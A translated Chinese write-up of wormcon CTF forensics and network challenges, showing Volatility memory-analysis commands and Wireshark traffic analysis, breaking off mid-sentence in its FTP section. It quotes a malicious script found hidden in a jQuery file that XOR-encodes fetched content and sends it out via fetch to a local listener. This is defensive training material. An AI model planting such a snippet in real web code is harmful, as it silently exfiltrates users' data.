# wormcom 0x01（forensics and network）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Secret Mission
###  Part1
> Description:
>
> Hello welcome back to work we got new project and after a great success in
> last case because of you we are giving you one more task this time. So we
> got a project from govt Secret agency that they are behind a person and they
> have doubt that he is involved with the hackers group and they given us the
> image of his system.we got a report that he got a message and next
> instruction to follow but after asking to person he is saying that he only
> got advance money and the details of it payment but no message can you find
> what is the message he received.
**cmdline**
查看命令行历史，发现notepad打开了apache日志文件，我们不应该认为这里存在flag，但是可以尝试。
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 cmdline
**pslist**
查看进程
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 pslist
**memdump**
然后去dump对应的notepad,wordpad进程内存
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n notepad.exe -D ctf/
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n wordpad.exe -D ctf/
但是发现notepad和wordpad的进程内存非常大，共三个进程内存，每个进程内存的大小都大于1g，导致无法使用记事本直接打开。可以使用010Editor打开，但是很难提取到有效信息。
**filescan**
使用该插件时发现无输出，此时应该考虑更换profile。
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 filescan | grep -E "pdf|txt|zip|png"
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep -E "pdf|txt"
输出中需要注意到`Invoice.pdf`（Invoice 为 发票）。
因此我们需要dump出该文件进行分析
**dumpfiles**
复制对应的文件地址进行dumpfiles
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000000570c430 -D ctf/
**forensic**
文件确实可以正常打开
010Editor打开,注意到这里有一段hex

我们通过xxd进行还原
    echo "" | xxd -p -r
最后经过base64解密即可
    wormcon{PDF_w1th_JS_1s_N0t_4n_0ld_Styl3}
###  Part 2
> He is contacting to the group via uncommon browser you have to find what is
> the name of the file on the system which he used to install and have to
> figure out did he open that browser or not. If yes then md5 the second last
> registry value added by that browser and if not open then md5 the last
> registry value added by that browser.
**Tor**
首先，不常见的浏览器，我们应该想到暗链中的洋葱浏览器，也就是Tor浏览器。其次，我们需要找到可执行文件的文件名，并确认他是否打开该浏览器，最后需要我们去提取注册表值。
关于Tor浏览器
[(PDF) Forensic Analysis of Tor Browser: A Case Study for Privacy and
Anonymity on the Web
(researchgate.net)](https://www.researchgate.net/publication/332004753_Forensic_Analysis_of_Tor_Browser_A_Case_Study_for_Privacy_and_Anonymity_on_the_Web)
**volatility**
    /volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 printkey -K "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
能得到其值
    C:\Program Files (x86)\Windows NT\Accessories\T0rbR0Ws3R-10.0.1.exe
###  Part 3
> Description:
>
> We find that he got project to develop a web project for the hackers but in
> hurry he leaked the critical information while developing a web project on
> his system. Find the information he leaked unintentionally
注意到两个重点信息
    web projectcritical information
**apache**
我们需要想到之前的apache2日志方面的信息并没有使用过，之前尝试过dump进程，但是效果并不好，试一下filescan，找到了access.log，dump下来。
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep log         ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000007c87d350 -D ctf/
**strings**
我们通过strings输出里面的内容，找到了奇怪的url，
进行base64解密后拿到了flag。
## Network At Risk
###  Part 1
> **Description:**  
>  We are in danger again we got a incident report by our system and after
> that we capture the network traffic but I think this is not a normal and
> easy one we have to do deep analysis but due to shortage of time I am giving
> the task to you. Hope you will find something intresting.
查看该流量包，总体上来看流量分为https和http两块流量。
**http**
http流量如下，我们需要注意到最后一个奇怪的http访问。
**malware**
我们标记该流量包，并往上翻可以看到很多css和javascript的文件。其中的html文件没有异常，那么我们考虑是javascript中藏了恶意代码。查阅jquery代码，找到了恶意代码块
    function a4sSiIgGn_vVa4lLuUe(text){                                                            CONTENT  = text ;                                                            return 1                                                        }                                                        function g3tTh3Wh4T(url){                                                            var request = new XMLHttpRequest();                                                            request.open('GET', url, true);                                                            request.send(null);                                                            request.onreadystatechange = function () {                                                                if (request.readyState === 4 && request.status === 200) {                                                                    var type = request.getResponseHeader('Content-Type');                                                                    if (type.indexOf("text") !== 1) {                                                                        a4sSiIgGn_vVa4lLuUe(request.responseText);                                                                                                         fetch('http://127.0.0.1:1337?' + enCrYpTX0r(CONTENT,k3Y) );                                 function enCrYpTX0r(text, key) {        return Array.from(                                                            text,                                                            (c, i) => (c.charCodeAt() ^ key.charCodeAt(i % key.length))                                                            ).join('s');                                                    }
**xor**
可以看到这里url后添加的是经过xor加密的代码块，我们找到key之后对url中的参数进行xor变换即可。
###  Part 2
> **Description:**  
>  This is the another network traffic we capture for the another network we
> followed the same process you told us in previous one but that doesn’t work
> in this case can you help us out in this also.
**ftp**
打开流量包，在前面就能看到FTP协议流量，由于FTP是一个比较容易跟踪的协议，我们这里直接跟踪ftp。
一共只有100多个tcp流，我们一个个查看过来即可，能找到一个加密的zip压缩包。对应着tcp.stream eq 0 中的